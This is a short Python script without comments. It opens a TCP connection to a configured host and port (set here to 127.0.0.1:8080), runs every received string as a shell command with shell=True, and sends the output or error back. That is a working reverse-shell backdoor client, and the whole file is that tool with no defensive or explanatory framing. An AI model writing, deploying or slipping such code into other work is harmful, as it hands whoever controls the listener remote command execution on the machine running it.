import socket
import subprocess
import os

port = 8080
host = '127.0.0.1'

def connection_to_server():
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    while True:
        data = s.recv(1024).decode()
        if data:
            try:
                output = subprocess.check_output(data, shell=True).decode()
                s.sendall(output.encode())
            except subprocess.CalledProcessError as e:
                error_msg = f"Command failed with return code {e.returncode}"
                s.sendall(error_msg.encode())
            except Exception as e:
                error_msg = f"Command failed with error: {e}"
                s.sendall(error_msg.encode())

connection_to_server()
